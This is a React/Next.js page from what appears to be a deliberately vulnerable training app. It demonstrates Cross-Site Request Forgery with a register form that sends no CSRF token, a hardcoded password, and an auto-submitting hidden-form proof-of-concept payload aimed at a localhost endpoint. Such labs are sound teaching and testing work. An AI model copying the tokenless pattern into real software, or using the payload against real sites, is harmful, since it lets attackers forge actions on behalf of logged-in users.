'use client';

import { useState } from 'react';
import Link from 'next/link';

const API = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:8080/api/v1';

export default function CSRF() {
    const [email, setEmail] = useState('');
    const [firstName, setFirstName] = useState('');
    const [result, setResult] = useState('');

    async function submit(e: React.FormEvent) {
        e.preventDefault();
        // No CSRF token — INTENTIONALLY VULNERABLE
        const res = await fetch(`${API}/auth/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password: 'Password123!', first_name: firstName }),
        });
        const data = await res.json();
        setResult(JSON.stringify(data, null, 2));
    }

    return (
        <div>
            <div className="mb-6">
                <Link href="/vuln" className="text-gray-500 hover:text-gray-300 text-sm">← back</Link>
                <h1 className="text-xl font-bold text-white mt-2">CSRF — Cross-Site Request Forgery</h1>
                <p className="text-gray-400 text-sm mt-1">
                    State-changing form with no CSRF token. Any page can silently trigger this action on behalf of a logged-in user.
                </p>
            </div>

            <div className="bg-gray-900 border border-yellow-700 rounded p-4 mb-6 text-sm text-yellow-300 font-mono">
                No <code>X-CSRF-Token</code> header. No <code>SameSite</code> cookie enforcement here. Cross-origin POST succeeds.
            </div>

            <form onSubmit={submit} className="space-y-3 mb-6">
                <input
                    value={firstName}
                    onChange={e => setFirstName(e.target.value)}
                    placeholder="First name"
                    className="w-full bg-gray-900 border border-gray-700 rounded px-3 py-2 text-sm text-white font-mono focus:border-red-500 outline-none"
                />
                <input
                    value={email}
                    onChange={e => setEmail(e.target.value)}
                    placeholder="victim@example.com"
                    className="w-full bg-gray-900 border border-gray-700 rounded px-3 py-2 text-sm text-white font-mono focus:border-red-500 outline-none"
                />
                <button type="submit" className="bg-red-700 hover:bg-red-600 text-white px-4 py-2 rounded text-sm font-bold">
                    Submit (no CSRF token)
                </button>
            </form>

            {result && (
                <div className="bg-gray-900 border border-gray-700 rounded p-4">
                    <pre className="text-green-400 text-xs font-mono">{result}</pre>
                </div>
            )}

            <div className="mt-4 bg-gray-900 border border-gray-700 rounded p-3 text-xs font-mono text-gray-500">
                <div className="mb-1">PoC hidden iframe attack:</div>
                <code className="text-orange-400 break-all">
                    {'<form action="http://localhost:8080/api/v1/auth/register" method="POST"><input name="email" value="pwned@evil.com">...</form><script>document.forms[0].submit()</script>'}
                </code>
            </div>
        </div>
    );
}
